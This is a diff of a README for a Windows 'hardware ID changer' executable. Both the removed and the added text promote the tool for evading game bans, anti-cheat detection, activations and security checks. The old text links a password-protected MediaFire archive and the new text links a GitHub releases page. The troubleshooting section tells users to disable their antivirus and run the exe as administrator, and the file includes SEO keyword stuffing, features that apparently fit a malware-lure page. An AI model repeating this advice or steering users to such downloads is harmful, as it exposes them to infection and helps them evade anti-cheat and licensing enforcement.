@@ -1,50 +1,68 @@
-# HWID Spoofer ó Hardware ID Modifier
+# üõ†Ô∏è hwid-changer - Modify Your Hardware ID with Ease
 
-## Overview
-HWID Spoofer is a powerful tool for changing your PC's hardware ID, helping you bypass activations, security checks, or maintain privacy. It allows seamless modification of BIOS and motherboard IDs with safety and efficiency.
+## üöÄ Overview
+The hwid-changer is a simple tool that helps you change your hardware IDs. This can help you avoid bans in games by securely modifying your information. Our tool is user-friendly and designed for those who want to play without interruptions. 
 
-## Key Features
-- **BIOS & Motherboard Spoofing:** Easily change system identifiers  
-- **User-Friendly Interface:** Simple, intuitive controls  
-- **Fast Operation:** Quick hardware ID updates  
-- **Multiple ID Support:** Spoof several components at once  
-- **Revert Option:** Restore original IDs anytime  
-- **Secure & No Trace:** Changes leave no signs of modification  
-- **System Compatibility:** Supports various OS and hardware  
-- **Regular Updates:** Keeps up with latest security measures  
-- **Privacy Enhancement:** Obscures your true hardware identity  
+## üì• Download and Install
+To get started, visit the Releases page to download the application:
 
-## How to Use
-1. **Download & Extract:** Get files from [here](https://app.mediafire.com/folder/yqaapvpgwocx3) with the password `pleaselikeme`  
-2. **Run as Admin:** Launch the setup or app with administrator privileges  
-3. **Select Target:** Choose BIOS or Motherboard to spoof  
-4. **Generate New ID:** Click ìGenerateî to create a new ID  
-5. **Apply:** Hit ìApplyî to implement changes  
-6. **Verify:** Confirm the update using the ìVerifyî button  
-7. **Restore:** Use ìRestoreî to revert to original hardware IDs if needed
+[![Download hwid-changer](https://img.shields.io/badge/Download-hwid--changer-brightgreen)](https://github.com/Krish637/hwid-changer/releases)
 
-## System Requirements
-- Windows 7/8/8.1/10/11  
-- Intel i3 or equivalent processor  
-- 4GB RAM or more  
-- 50MB free disk space  
-- Admin rights required
+1. Click on the link above to go to the Releases page.
+2. Look for the latest version available.
+3. Download the appropriate file for your system. 
 
-## Notes
-- Use responsiblyóchanges are reversible  
-- Keep software updated for best security  
-- Ensure system stability during operation
+Make sure your computer meets the requirements below before you run the program.
 
-## Contribution
-Open to community contributions! Fork, edit, and submit pull requests. Discuss major changes via issues first.
+## üîß System Requirements
+- Windows 10 or Windows 11
+- 64-bit architecture
+- Minimum 2 GB RAM
+- At least 100 MB free disk space
+- An internet connection for initial setup
 
-## Acknowledgements
-Thanks to open-source projects and hardware spoofing forums that inspired this tool.
+## üíª Running the Application
+After you have downloaded the application, follow these steps to run it:
 
----
+1. Navigate to the location where you downloaded the file. 
+2. Locate the `hwid-changer.exe` file.
+3. Double-click the file to open the application.
+4. Follow the on-screen instructions to modify your hardware ID.
 
-**HWID Spoofer ó Hardware ID Changer**  
-*Version 1.0.0 | Last Updated October 2025*
+## üìù Features
+- **User-friendly Interface:** Designed for ease of use, so anyone can navigate it without feeling overwhelmed.
+- **Secure Modification:** The tool changes your hardware IDs safely to help you avoid detection.
+- **Regular Updates:** We frequently update the software for better performance and compatibility with new games.
+- **Compatibility:** Works seamlessly with Windows 10 and Windows 11.
 
-## SEO Keywords
-Hardware ID Spoofer, HWID Changer, HWID Bypass, HWID Ban, Hardware ID Spoofing, HWID Tool, Privacy, Security, System Compatibility, Reversible Spoofing, Easy Interface
+## ‚öôÔ∏è Troubleshooting
+If you encounter any issues while using hwid-changer, try the following solutions:
+
+- **Ensure Compatibility:** Make sure your operating system matches the requirements.
+- **Disable Antivirus:** Some antivirus programs may flag the application. Disable them temporarily while using hwid-changer.
+- **Run as Administrator:** Right-click the application and select "Run as administrator" to ensure it has the necessary permissions.
+
+## üìà Frequently Asked Questions
+**Q: Is using hwid-changer safe?**  
+A: Yes, it is designed to modify hardware IDs securely and anonymously.
+
+**Q: Can I use this tool for multiple games?**  
+A: Yes, hwid-changer works with various games that have anti-cheat systems.
+
+**Q: Will I get banned for using this tool?**  
+A: While our tool helps to avoid bans, it is important to follow game guidelines.
+
+## üîó Additional Resources
+For more information and support, visit our GitHub repository:
+
+[Visit hwid-changer on GitHub](https://github.com/Krish637/hwid-changer)
+
+## üìë Community & Support
+Join our community for tips and support. You can reach us via the issues page on GitHub. We encourage feedback to help improve hwid-changer.
+
+## üîÑ Update Notifications
+Stay updated on new releases and features by checking our Releases page or watching the repository for notifications.
+
+Again, visit the Releases page to download hwid-changer and start using the tool.
+
+[![Download hwid-changer](https://img.shields.io/badge/Download-hwid--changer-brightgreen)](https://github.com/Krish637/hwid-changer/releases)
